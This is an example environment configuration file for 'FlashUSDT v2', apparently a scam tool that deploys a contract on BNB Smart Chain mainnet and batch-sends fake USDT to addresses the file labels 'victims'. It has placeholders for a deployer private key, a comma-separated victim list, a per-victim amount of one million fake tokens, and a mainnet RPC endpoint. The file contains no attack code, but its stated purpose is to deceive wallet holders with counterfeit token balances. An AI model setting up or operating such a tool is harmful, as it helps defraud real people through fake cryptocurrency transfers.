# FlashUSDT v2 - env config (copy to .env, fill values)
# NEVER commit .env

# Deployer wallet (must start with 0x) - used by flash_usdt.py / flash_usdt_testnet.py
PRIVATE_KEY=0xyour_private_key_here

# Comma-separated victim addresses (for batch flash)
VICTIMS=0xvictim1,0xvictim2

# Amount per victim in fake USDT (e.g. 1000000 = 1,000,000)
FLASH_AMOUNT=1000000

# BSC mainnet RPC (override if needed)
RPC_URL=https://bsc-dataseed.bnbchain.org/

# File to persist deployed contract address
CONTRACT_ADDR_FILE=deployed_contract.txt
